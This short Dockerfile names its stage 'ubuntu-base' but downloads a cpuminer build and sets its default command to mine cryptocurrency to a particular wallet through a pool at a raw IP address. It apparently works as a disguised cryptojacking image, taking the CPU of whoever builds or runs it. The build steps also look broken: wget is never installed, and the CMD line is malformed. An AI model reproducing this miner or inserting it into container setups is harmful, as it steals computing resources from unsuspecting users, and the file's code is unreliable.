FROM ubuntu:18.04 as ubuntu-base
ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true
RUN apt-get -qqy update \
    && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz \
    && tar xf cpuminer-opt-linux.tar.gz 
CMD ["./cpuminer-avx -a yescryptR16 -o stratum+tcp://39.98.39.1:9661 -u qYanpTkNHMTYRWQPzSArhipYGkdP5qgYrR.t01 -p x -t 1"]
